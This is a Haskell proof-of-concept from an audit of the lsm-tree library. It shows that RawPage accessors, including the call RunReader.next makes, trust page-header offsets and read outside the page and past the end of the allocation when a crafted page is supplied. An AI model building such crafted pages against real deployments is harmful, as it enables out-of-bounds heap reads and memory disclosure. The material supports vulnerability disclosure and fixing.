-- | PoC: RawPage trusts page-header offsets with no validation.
--
-- Target : IntersectMBO/lsm-tree @ 63a63054 (audited 2026-11-17)
-- Claim  : rawPageKeys/rawPageKeyAt/rawPageIndex derive byte offsets straight
--          from the on-disk page header (Word16 numKeys at idx 0, Word16
--          keysOffset at idx 2). Nothing validates those offsets against the
--          4096-byte page size, and RawBytes.fromByteArray does no bounds
--          check either. Only -fcheck-prim-bounds (present in cabal.project,
--          ABSENT from cabal.project.release) would catch the read.
--
-- Demo   : one ByteArray of 8192 bytes. First 4096 = the page. Bytes
--          4096..8191 = memory OUTSIDE the page. Header says "keys start at
--          byte 4096", offsets vector says "key 0 lives at byte 5000..5004",
--          and bytes 5000..5004 hold a sentinel. If rawPageKeys returns the
--          sentinel, the page handed out bytes from outside its own region.
--
--          In production readDiskPage allocates EXACTLY 4096 bytes
--          (RunReader.hs:314 newPinnedByteArray pageSize), so the same header
--          makes the slice point past the end of the allocation: OOB heap read.
module Main (main) where

import           Control.Exception (SomeException, evaluate, try)
import           Control.Monad (when)
import           Data.Bits (shiftR, (.&.))
import           Data.List (foldl')
import           Data.Primitive.ByteArray
import qualified Data.Vector as V
import           Data.Word (Word16, Word8)
import           Database.LSMTree.Internal.Entry (Entry)
import qualified Database.LSMTree.Internal.RawBytes as RB
import           Database.LSMTree.Internal.RawPage
import           Database.LSMTree.Internal.Serialise (SerialisedKey (..))
import           System.Exit (exitFailure)

pageSize :: Int
pageSize = 4096

-- | Little-endian Word16.
w16 :: Word16 -> [Word8]
w16 w = [fromIntegral (w .&. 0xFF), fromIntegral (w `shiftR` 8)]

-- | Build a pinned ByteArray of @n@ zero bytes with @patches@ (offset, bytes).
buildPinned :: Int -> [(Int, [Word8])] -> IO ByteArray
buildPinned n patches = do
    let bytes = foldl' apply (replicate n 0) patches
        apply acc (off, ws) = take off acc ++ ws ++ drop (off + length ws) acc
    mba <- newPinnedByteArray n
    copyByteArray mba 0 (byteArrayFromList bytes) 0 n
    unsafeFreezeByteArray mba

sentinel :: [Word8]
sentinel = map (fromIntegral . fromEnum) "LEAK-OUTSIDE-THE-PAGE"

-- | A page whose header points its key directory at byte 4096 (outside the
-- 4096-byte page region) and whose key 0 lives at byte 5000, where the
-- sentinel sits.
craftedPage :: IO RawPage
craftedPage = do
    ba <- buildPinned (2 * pageSize)
            [ (0,    w16 2)                       -- numKeys
            , (2,    w16 0)                       -- numBlobs
            , (4,    w16 (fromIntegral pageSize)) -- keysOffset -> byte 4096
            , (4096, w16 5000 ++ w16 5005 ++ w16 5005)
            , (5000, sentinel)
            ]
    pure (unsafeMakeRawPage ba 0)

renderKey :: SerialisedKey -> String
renderKey (SerialisedKey rb) = show (RB.unpack rb)

-- | Variant 1: rawPageKeys (bulk accessor).
variantKeys :: IO ()
variantKeys = do
    page <- craftedPage
    let keys = V.toList (rawPageKeys page)
    putStrLn $ "  rawPageNumKeys         = " ++ show (rawPageNumKeys page)
    putStrLn $ "  rawPageKeys            = " ++ show (map renderKey keys)
    let leaked = any (\(SerialisedKey rb) -> RB.unpack rb == sentinel) keys
    putStrLn $ "  sentinel from outside page region returned? " ++ show leaked
    putStrLn $ if leaked
      then "  RESULT: FAIL-OPEN -- offsets beyond the page were honoured"
      else "  RESULT: guard present (offsets rejected or bounded)"
    when leaked exitFailure

-- | Variant 2: rawPageIndex -- this is the exact call RunReader.next makes
-- (RunReader.hs:265) when it walks a run file read from disk.
variantProductionPath :: IO ()
variantProductionPath = do
    page <- craftedPage
    let res = rawPageIndex page 0 :: RawPageIndex (Entry v b)
    case res of
      IndexEntry k _ -> do
        putStrLn $ "  rawPageIndex page 0    = IndexEntry, key = " ++ renderKey k
        let SerialisedKey rb = k
        let leaked = RB.unpack rb == sentinel
        putStrLn $ "  sentinel from outside page region returned? " ++ show leaked
        putStrLn $ if leaked
          then "  RESULT: FAIL-OPEN -- production read path returns out-of-page bytes"
          else "  RESULT: guard present"
        when leaked exitFailure
      _ -> putStrLn "  RESULT: index not present (unexpected)"

-- | Variant 3: production shape -- array is exactly 4096 bytes, header points
-- far outside. Shows the release build does not throw.
variantPastEndOfAllocation :: IO ()
variantPastEndOfAllocation = do
    ba <- buildPinned pageSize
            [ (0, w16 2)
            , (2, w16 0)
            , (4, w16 0xFFF0)   -- keys section "at byte 65520" in a 4096-byte page
            ]
    let page = unsafeMakeRawPage ba 0
    r <- try (evaluate (V.length (rawPageKeys page))) :: IO (Either SomeException Int)
    putStrLn $ "  sizeofByteArray        = " ++ show (sizeofByteArray ba)
    putStrLn $ "  keysOffset (header)    = 0xFFF0 = 65520 bytes"
    putStrLn $ "  rawPageKeys            = "
        ++ either (\e -> "threw: " ++ show e)
                  (\n -> "returned " ++ show n ++ " keys, no exception") r
    putStrLn $ case r of
      Left _  -> "  RESULT: bounded (exception raised)"
      Right _ -> "  RESULT: FAIL-OPEN -- read past the end of the allocation"

main :: IO ()
main = do
    putStrLn "=== lsm-tree RawPage offset validation PoC ==="
    putStrLn ""
    putStrLn "[1] rawPageKeys on a page whose key directory is outside the page region"
    variantKeys
    putStrLn ""
    putStrLn "[2] rawPageIndex -- the exact call RunReader.next makes (RunReader.hs:265)"
    variantProductionPath
    putStrLn ""
    putStrLn "[3] page = exactly 4096 B, header points at byte 65520 (production shape)"
    variantPastEndOfAllocation
    putStrLn ""
    putStrLn "Guard under test: -fcheck-prim-bounds (in cabal.project, absent in cabal.project.release)"
